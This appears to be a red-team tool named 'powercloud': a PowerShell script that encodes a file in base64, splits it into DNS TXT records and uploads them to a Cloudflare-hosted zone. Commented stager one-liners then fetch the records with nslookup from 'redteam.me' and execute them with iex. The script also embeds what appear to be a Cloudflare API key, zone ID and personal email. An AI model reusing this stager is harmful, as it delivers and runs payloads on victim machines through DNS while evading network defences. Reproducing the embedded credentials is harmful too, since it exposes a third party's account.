# powercloud

```csharp
# (nslookup.exe -q=txt 1.redteam.me greg.ns.cloudflare.com)[-1]

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Global:API = "15830cf98db922a850916f4989ab2ce49fe4d"
$Global:zoneId = "6352a2c35cf18b6c960a166e944ff375"
$Global:API_URL = "https://api.cloudflare.com/client/v4"
$Global:EMAIL = "mantvydo@gmail.com"
$Global:HEADERS = @{
    "X-Auth-Key" = $API
    "X-Auth-Email" = $EMAIL
    # "Content-Type" = "application/json"
}

function Invoke-GetRequest($URL) {
    $response = Invoke-WebRequest -Uri $URL -Headers $Global:HEADERS
    return $response
}
function Invoke-PostRequest($URL, $body, $headers) {
    $FilePath = 'C:\tools\powercloud\zone.txt';
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
    $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
    $boundary = [System.Guid]::NewGuid().ToString(); 
    $LF = "`r`n";
    
    $bodyLines = ( 
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"zone.txt`"",
        "Content-Type: application/octet-stream$LF",
        $fileEnc,
        "--$boundary--$LF" 
    ) -join $LF
    
    $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines -Headers $Global:HEADERS  
    return $response
}
function Encode-File($file) {
    $fileContent = Get-Content -raw $file
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
    $b64 = [Convert]::ToBase64String($bytes)
    return $b64
}
function Get-Chunks($b64) {
    $chunks = New-Object System.Collections.ArrayList
    $i = 0
    $chunksCount = $b64.length / 250
    while ($i -le ($b64.length - 250)) {  
        $chunk = $b64.Substring($i, 250)
        $i += 250
        $chunks.Add($chunk) | Out-Null
    }    
    $chunks.Add(($b64.Substring($i))) | Out-Null
    return $chunks
}

function New-TXTRecord($name, $value) { 
    return "$name IN TXT $value`n"
}

# function New-Body($data) {
#     $boundary = [System.Guid]::NewGuid().ToString()
#     $LF = "`r`n"
#     $body = (
#         "--------------------------$boundary",
#         "Content-Disposition: form-data; name=`"file`"; filename=`"zone.txt`"",
#         "Content-Type: plain/text$LF",
#         $data,
#         "--$boundary--$LF"
#         ) -join $LF
#     return $body
# }

function New-ZoneFile($chunks) {
    [int] $i=1
    # $chunks = $chunks | Where-Object {$_}
    $chunks[1..$chunks.length] | foreach-object {
        $zonefile += New-TXTRecord $i $_
        write-host i yra: $i
        write-host value yra: $_
        $i++
    }
    return $zoneFile
}

$b64 = Encode-File "C:\tools\powercloud\file*"
$chunks = Get-Chunks $b64
# $chunks
$zoneFile = New-ZoneFile $chunks
Out-File -FilePath zone.txt -InputObject $zoneFile -Encoding "ASCII"

$res = Invoke-PostRequest $Global:API_URL/zones/$Global:zoneId/dns_records/import $body $Global:HEADERS


# $STAGER_CMD = 'for ($i=1;$i -le {};$i++){{$b64+=iex(nslookup -q=txt -timeout={} $i\'.{}\')[-1]}};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))'.format(str(len(chunks)), timeout, domain)
# $STAGER_CMD = "for ($i=1;$i -le 1;$i++){$b64+=iex(nslookup -q=txt -timeout=5 .redteam.me'')[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))"



# (1, 2) | ForEach-Object { (nslookup -q=txt "$_.redteam.me" greg.ns.cloudflare.com)[-1] }


# (1) | ForEach-Object { { $b64+=iex(nslookup -q=txt -timeout=5 "$_.redteam.me" greg.ns.cloudflare.com)[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64)))) }

# (1, 1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me" greg.ns.cloudflare.com)[-1]; $b64=$b64 -replace('\t|"',""); $b64 }
# $b64=""; (1, 1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me" greg.ns.cloudflare.com)[-1]; $b64=$b64 -replace('\t|"',""); iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64)))) }








```

